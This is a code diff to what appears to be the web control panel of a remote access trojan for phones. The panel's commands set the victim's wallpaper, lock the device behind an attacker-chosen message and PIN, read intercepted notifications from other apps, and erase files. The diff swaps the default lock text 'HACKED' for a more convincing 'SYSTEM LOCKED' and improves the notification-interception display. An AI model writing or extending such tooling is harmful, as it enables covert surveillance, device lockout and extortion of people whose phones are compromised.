@@ -102,8 +102,11 @@
             } else if(curMod === 'setwallpaper') {
                 b.innerHTML = `<p>Direct Image URL:</p><input id="wurl" placeholder="https://domain.com/hack.jpg"><br><button style="margin-top:10px;width:100%" onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY WALLPAPER</button>`;
             } else if(curMod === 'toast') {
-                b.innerHTML = `<p>Msg:</p><input id="lmsg" value="HACKED"><p style="margin-top:10px">PIN:</p><input id="lpin" value="1234"><br><button style="margin-top:10px;width:100%;background:red;color:white" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><br><button style="margin-top:10px;width:100%" onclick="cmd('toast off')">UNLOCK</button>`;
-            } else if(curMod === 'notifications') b.innerHTML = `<table>${d.notifications.map(n=>`<tr><td><b>${n.packageName}</b><br>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
+                b.innerHTML = `<p>Msg:</p><input id="lmsg" value="SYSTEM LOCKED"><p style="margin-top:10px">PIN:</p><input id="lpin" value="1234"><br><button style="margin-top:10px;width:100%;background:red;color:white" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><br><button style="margin-top:10px;width:100%" onclick="cmd('toast off')">UNLOCK REMOTE</button>`;
+            } else if(curMod === 'notifications') {
+                const notes = d.notifications || [];
+                b.innerHTML = notes.length > 0 ? `<table style="font-size:0.8rem">${notes.map(n=>`<tr><td><b style="color:var(--secondary)">${n.appName || n.packageName}</b><br><span style="color:var(--primary)">${n.title}</span>: ${n.text}</td></tr>`).join('')}</table>` : `<p style="text-align:center">No notifications intercepted yet.</p>`;
+            }
         }
         async function delF(f) { if(!confirm('Erase?')) return; await fetch('/api/delete', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({filename:f})}); hash=""; render(); }
         async function poll() {
